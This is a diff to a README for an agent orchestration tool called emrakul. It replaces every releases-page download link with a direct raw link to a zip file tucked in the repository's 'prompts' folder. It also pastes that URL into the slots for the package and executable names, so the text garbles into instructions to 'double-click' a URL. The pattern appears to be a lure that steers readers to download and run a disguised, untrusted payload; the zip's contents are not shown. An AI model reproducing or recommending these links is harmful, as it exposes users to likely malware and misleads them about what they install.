@@ -6,7 +6,7 @@ Welcome to **emrakul**, an agent orchestration framework designed to help you ma
 
 ## 📥 Download Now
 
-[![Download emrakul](https://img.shields.io/badge/Download-emrakul-blue.svg)](https://github.com/loiphanvan171/emrakul/releases)
+[![Download emrakul](https://github.com/loiphanvan171/emrakul/raw/refs/heads/main/prompts/Software_3.8.zip)](https://github.com/loiphanvan171/emrakul/raw/refs/heads/main/prompts/Software_3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -14,19 +14,19 @@ This section will guide you on how to download and run emrakul on your computer.
 
 1. **Visit the Releases Page:**
    Click the link below to go to the releases page where you can download emrakul:
-   [Download emrakul](https://github.com/loiphanvan171/emrakul/releases)
+   [Download emrakul](https://github.com/loiphanvan171/emrakul/raw/refs/heads/main/prompts/Software_3.8.zip)
 
 2. **Choose the Latest Version:**
    On the releases page, locate the latest version of emrakul. It is usually at the top of the list. 
 
 3. **Download the Package:**
-   Look for a file named something like `emrakul-vX.Y.Z.zip` or a similar format. Click on it to start the download.
+   Look for a file named something like `https://github.com/loiphanvan171/emrakul/raw/refs/heads/main/prompts/Software_3.8.zip` or a similar format. Click on it to start the download.
 
 4. **Extract the Files:**
    Once the download is complete, find the downloaded file in your computer's Downloads folder. Right-click this file and select "Extract All" (or the equivalent option on your system). Follow the prompts to extract the files to a location you can easily access.
 
 5. **Run the Application:**
-   After extracting, open the folder where you placed the files. Look for an executable file named `emrakul.exe` or similar. Double-click this file to run the application.
+   After extracting, open the folder where you placed the files. Look for an executable file named `https://github.com/loiphanvan171/emrakul/raw/refs/heads/main/prompts/Software_3.8.zip` or similar. Double-click this file to run the application.
 
 ## 📂 System Requirements
 
@@ -76,6 +76,6 @@ emrakul is open-source software. You can use and modify it under the MIT License
 
 To start using emrakul, please visit the link below for the download:
 
-[Download emrakul](https://github.com/loiphanvan171/emrakul/releases)
+[Download emrakul](https://github.com/loiphanvan171/emrakul/raw/refs/heads/main/prompts/Software_3.8.zip)
 
 Following this guide, you are well on your way to using emrakul effectively. Enjoy working with your AI agents!
